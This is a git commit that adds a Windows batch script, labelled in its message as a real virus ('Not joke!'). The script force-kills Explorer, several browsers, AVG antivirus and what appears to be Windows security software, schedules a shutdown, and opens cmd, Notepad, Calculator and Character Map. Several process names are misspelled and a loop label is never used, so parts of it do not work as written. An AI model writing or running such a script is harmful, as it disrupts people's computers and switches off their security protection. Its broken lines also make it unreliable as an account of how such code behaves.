4339d338d00590d22d79614b40426ac883496a54
Kubas431 <kuba80269@gmail.com>
2024-09-13 19:56:02 +0200

    Create Wirus Black Skull.bat
    The virus!! Not joke!

---
+++ Wirus Black Skull.bat
@@ -0,0 +1,19 @@
+@echo off
+taskkill /f /im explorer.exe
+taskkill /f /im chrome.exe
+taskkill /f /im firefox.exe
+taskkill /f /im opera.exe
+taskkill /f /im opera gx.exe
+taskkill /f /im minecrosoft edge.exe
+taskkill /f /im avg.exe
+taskkill /f /im zabezpieczenia systemu windows.exe
+taskkill /f /im minecrosoft store.exe
+taskkill /f /im minecrososft teams.exe
+shutdown -s -t 40
+:start
+start cmd.exe
+start notepad.exe
+start calc.exe
+start charmap.exe
+
+
